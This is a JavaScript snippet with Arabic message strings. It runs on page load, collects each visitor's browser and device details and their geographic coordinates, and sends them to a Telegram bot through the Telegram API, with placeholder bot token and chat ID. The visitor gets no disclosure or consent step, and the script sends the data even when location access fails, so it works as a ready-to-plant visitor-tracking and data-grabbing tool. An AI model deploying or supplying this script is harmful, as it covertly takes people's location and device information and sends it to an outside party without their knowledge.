window.onload = function() {
    const userData = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine,
        browserName: getBrowserName(),
        deviceType: getDeviceType()
    };

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            userData.latitude = position.coords.latitude;
            userData.longitude = position.coords.longitude;
            sendDataToTelegram(userData);
        }, error => {
            console.error("خطأ في الحصول على الموقع:", error);
            sendDataToTelegram(userData);
        });
    } else {
        sendDataToTelegram(userData);
    }
};

function getBrowserName() {
    const agent = window.navigator.userAgent.toLowerCase();
    switch (true) {
        case agent.indexOf("edge") > -1: return "Microsoft Edge";
        case agent.indexOf("chrome") > -1: return "Google Chrome";
        case agent.indexOf("firefox") > -1: return "Mozilla Firefox";
        case agent.indexOf("safari") > -1: return "Apple Safari";
        default: return "غير معروف";
    }
}

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
        return "تابلت";
    }
    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
        return "هاتف محمول";
    }
    return "حاسوب";
}

function sendDataToTelegram(data) {
    const botToken = 'YOUR_BOT_TOKEN';
    const chatId = 'YOUR_CHAT_ID';
    const text = `
معلومات المستخدم:
وكيل المستخدم: ${data.userAgent}
اللغة: ${data.language}
دقة الشاشة: ${data.screenResolution}
المنطقة الزمنية: ${data.timeZone}
المنصة: ${data.platform}
الكوكيز مفعلة: ${data.cookiesEnabled}
حالة الاتصال: ${data.onlineStatus ? 'متصل' : 'غير متصل'}
المتصفح: ${data.browserName}
نوع الجهاز: ${data.deviceType}
${data.latitude ? `خط العرض: ${data.latitude}` : ''}
${data.longitude ? `خط الطول: ${data.longitude}` : ''}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(response => response.json())
    .then(result => console.log('تم إرسال البيانات بنجاح:', result))
    .catch(error => console.error('خطأ في إرسال البيانات:', error));
}
